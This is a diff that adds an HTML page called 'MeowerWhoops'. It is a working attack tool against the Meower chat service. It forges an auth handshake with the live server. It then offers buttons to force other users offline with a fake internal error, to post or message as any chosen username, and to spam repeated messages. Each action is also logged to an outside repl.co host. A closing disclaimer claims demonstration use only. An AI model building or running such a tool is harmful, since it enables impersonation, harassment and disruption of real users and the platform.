@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width" />
+    <title>MeowerWhoops</title>
+    <link href="style.css" rel="stylesheet" type="text/css" />
+  </head>
+
+  <body>
+    <script>
+      function forceConnect() {
+        document.getElementById('connection').style.display = 'none';
+        document.getElementById('content').style.display = 'block';
+        log('Connected', 'Successfully connected to Meower server.');
+      }
+      function log(action, data) {
+        fetch(`https://meowerwhoops.tnix100.repl.co/log?action=${action}&data=${data}`)
+      }
+      function disconnect_user() {
+        disconnected_username = prompt("What user would you like to disconnect?");
+        cljs.send({"cmd":"pmsg","id":`${disconnected_username}`,"val":"E:INTERNAL_SERVER_ERR","origin":`${cljs.username}`});
+        log('Disconnected User', `User: ${disconnected_username}`);
+        alert("User disconnected!");
+      };
+    function spoof_msg(amount) {
+      spoof_user = prompt("What user would you like to send this message as?");
+      og_msg = prompt("What would you like to say in the message?");
+      amount += 1;
+      var i = 1;
+      var msg = '';
+      while (i > 0 && i < amount) {
+        msg = `${msg} ${og_msg}`
+        i += 1;
+      }
+      cljs.send({"cmd":"gmsg","val":`{\"mode\": 2, \"u\": \"${spoof_user}\", \"t\": {\"mo\":69, \"d\": 69, \"y\": 6969, \"h\": 69, \"mi\": 69, \"s\": 69}, \"p\": \"${msg}\"}`});
+      log('Send Message', `User: ${spoof_user} Message: ${og_msg} Amount: ${amount}`);
+      alert("Message sent!");
+    };
+    function spoof_post() {
+      spoof_user = prompt("What user would you like to send this post as?");
+      msg = prompt("What would you like to say in the post?");
+      cljs.send({"cmd":"gmsg","val":`{\"mode\": 1, \"u\": \"${spoof_user}\", \"t\": {\"mo\":69, \"d\": 69, \"y\": 6969, \"h\": 69, \"mi\": 69, \"s\": 69}, \"p\": \"${msg}\"}`});
+      log('Send Post', `User: ${spoof_user} Message: ${msg}`);
+      alert("Post sent!");
+    }
+    </script>
+    <div id="connection" style="display: block;">
+      <h2>Connecting... Please wait.</h2>
+    </div>
+    <div id="content" style="display: none;">
+      <h2>Connected and authenticated!</h2>
+      <br>
+      <button style="background-color: #f44336" onclick="disconnect_user()">Disconnect User</button>
+      <button style="background-color: #008CBA" onclick="spoof_post()">Send Post</button>
+      <button style="background-color: #008CBA" onclick="spoof_msg(1)">Send Message</button>
+      <button style="background-color: #eb8934" onclick="spoof_msg(parseInt(prompt('How many times would you like to send this message?')), 10);">Spam Message</button>
+    </div>
+    <h4 style="color: #eb4934;">This website is meant for demonstration purposes!<br>I do not condone malicious use with this website!<br><br>If you are caught using it for negatively affecting Meower, I will ban you from using this site.</h4>
+    <script type="module">
+      import CloudlinkJS from "./script.js";
+      var username = `${Math.floor((Math.random() * 999999) + 1)}`;
+      var password = 'yes';
+      var url = "wss://server.meower.org"
+      var cljs = new CloudlinkJS(url);
+      window.cljs = cljs;
+      cljs.on("data", (data) => {
+        console.log(data);
+        if (data.cmd === "pmsg" && data.origin === "%CA%") {
+          try {
+            var token = JSON.parse(data.val).token;
+            cljs.send({
+              cmd: "auth",
+              id: "%CD%",
+              val: token,
+              origin: username,
+            });
+          } catch {
+            console.log(data);
+          }
+        } else if (data.cmd === "pmsg" && data.origin === "%CD%") {
+          var jsobj = JSON.parse(data.val);
+					console.log(jsobj);
+          forceConnect();
+        }
+      });
+      cljs.on("opened", () => {
+        cljs.send({ cmd: "setid", val: username });
+        cljs.send({
+          cmd: "auth",
+          id: "%CA%",
+          val: password,
+          origin: username,
+        });
+      });
+    </script>
+  </body>
+</html>
